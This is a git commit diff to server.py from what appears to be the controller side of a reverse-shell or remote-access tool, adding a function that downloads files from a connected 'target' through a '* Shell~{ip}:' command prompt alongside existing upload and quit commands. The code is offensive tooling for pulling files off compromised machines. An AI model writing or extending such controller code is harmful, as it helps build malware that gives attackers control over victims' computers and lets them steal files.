7bfa42d9f1fdc2413dd3ff38770c69195d72310d
Sivadath <52615657+sivadathdev@users.noreply.github.com>
2022-07-01 08:55:19 +0530

    Update server.py
    added the download functionality.

--- server.py
+++ server.py
@@ -21,6 +21,19 @@ def upload_file(file_name):
 	f = open(file_name, "rb")
 	target.send(f.read())
 
+def download_file(file_name):
+	f = open(file_name, 'wb') 
+	target.settimeout(1)
+	chunk = target.recv(1024) 
+	while True: 
+		f.write(chunk)
+		try:
+			chunk = target.recv(1024) 
+		except socket.timeout as e: 
+			break
+	target.settimeout(None)
+	f.close()
+
 def target_communication():
 	while True:
 		command = input(f"* Shell~{ip}: ").lower()
@@ -33,6 +46,8 @@ def target_communication():
 			pass
 		elif command[:6] == "upload":
 			upload_file(command[7:])
+		elif command[:8] == "download":
+			download_file(command[9:])
 		elif command == "help":
 			            print(colored('''\n
             quit                                --> Quit Session With The Target
